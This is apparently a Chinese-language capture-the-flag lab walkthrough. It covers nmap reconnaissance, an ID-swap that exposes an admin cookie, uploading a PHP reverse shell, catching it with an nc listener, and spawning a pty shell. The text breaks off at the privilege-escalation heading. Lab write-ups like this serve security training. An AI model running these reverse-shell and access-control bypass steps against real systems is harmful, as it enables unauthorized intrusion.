### 一、渗透流程
1. 信息收集
 nmap -sC -sV 10.129.86.26 
    > 出现`22`端口及`80端口`

2. 登录web页面
根据页面提示，存在登录页面，通过`burp suite`工具的`target`模块发现路径`http://10.129.86.26/cdn-cgi/login/`
    >  特殊点:存在`guest`用户免密登录

3. 敏感信息收集
-  帐号页面url为:http://10.129.86.26/cdn-cgi/login/admin.php?content=accounts&id=2
-  upload菜单需要admin用户权限
> 因此，我们需要尝试使用admin用户去打开upload页面，利用可能存在的文件上传漏洞获取webshell。通过更改id为1即可获得帐号的cookie信息

### 二、获得webshell
1. 利用`burp suite`抓取数据包，并利用admin的cookie进去水平越权，从而上传文件`php-reverse-shell.php`
> php-reverse-shell.php为使用php脚本写的反弹shell文件，发送端口为`1234`

2. 运行nc获取webshell
> nc -lvnp 1234

3. 运行反弹php脚本,从而获取webshell
> http://10.129.86.26/uploads/php-reverse-shell.php

4. 从目录里面查找敏感文件，得到相关用户的帐号和密码

### 三、提权
1. 生成一个功能性终端
> python3 -c 'import pty;pty.spawn("/bin/sh")' 

2. 
